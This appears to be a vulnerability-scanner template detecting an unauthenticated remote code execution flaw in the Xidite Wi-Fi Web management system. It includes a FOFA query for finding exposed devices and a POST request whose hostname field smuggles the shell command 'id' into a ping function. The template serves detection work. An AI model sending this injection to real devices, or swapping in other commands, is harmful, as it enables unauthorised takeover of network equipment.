expression: r0()
id: xidite-wifi-web-cookie-bypass
info:
  author: daffainfo
  description: "\u897F\u8FEA\u7279\u63D0\u4F9B\u7684Wireless\u89E3\u51B3\u65B9\u6848\
    \u4E3A\u5BA2\u6237\u63D0\u4F9B\u4E00\u5957\u4E91\u7BA1\u7406,\u53EF\u9760\u6027\
    \u9AD8,\u8986\u76D6\u8303\u56F4\u5E7F\u7684\u65E0\u7EBF\u7EC4\u7F51\u4EA7\u54C1\
    \u3002\u65E8\u5728\u89E3\u51B3\u7528\u6237\u7F51\u7EDC\u8986\u76D6\u4FE1\u53F7\
    \u8303\u56F4\u5C0F,\u4FE1\u53F7\u4F4E,\u7F51\u7EDC\u4E0D\u7A33\u5B9A,\u7EC4\u7F51\
    \u56F0\u96BE\u7B49\u95EE\u9898\u3002\u897F\u8FEA\u7279Wi-Fi Web\u7BA1\u7406\u7CFB\
    \u7EDF\u5B58\u5728\u672A\u6388\u6743\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\
    \u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\
    \u670D\u52A1\u5668\u6743\u9650\u3002\nfofa-query: title==\"Wi-Fi Web\u7BA1\u7406\
    \"\n"
  name: "\u897F\u8FEA\u7279 Wi-Fi Web\u7BA1\u7406\u7CFB\u7EDF \u672A\u6388\u6743RCE\u6F0F\
    \u6D1E"
  reference:
  - https://mp.weixin.qq.com/s/IIphedK_Npni5bJsQHfD0A
  severity: critical
  verified: false
rules:
  r0:
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
    request:
      body: call_function=ping&iface=eth0&hostname=127.0.0.1%3Bid
      method: POST
      path: /cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1
